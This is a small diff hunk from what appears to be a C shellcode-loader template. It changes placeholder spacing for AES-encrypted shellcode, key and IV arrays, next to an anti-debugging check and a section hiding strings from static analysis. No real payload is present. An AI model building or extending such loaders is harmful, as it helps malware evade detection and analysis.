@@ -58,9 +58,9 @@ int CheckIfDebuggerPresent() {
 // SECTION 1: AES-256 Encrypted Shellcode (from aes_encrypt.py)
 // ============================================================
 
-unsigned char encrypted_shellcode[] = { ${ SHELLCODE } };
-unsigned char aes_key[] = { ${ KEY } };
-unsigned char aes_iv[] = { ${ IV } };
+unsigned char encrypted_shellcode[] = { ${SHELLCODE} };
+unsigned char aes_key[] = { ${KEY} };
+unsigned char aes_iv[] = { ${IV} };
 
 // ============================================================
 // SECTION 2: Stack Strings (no strings in .rdata)
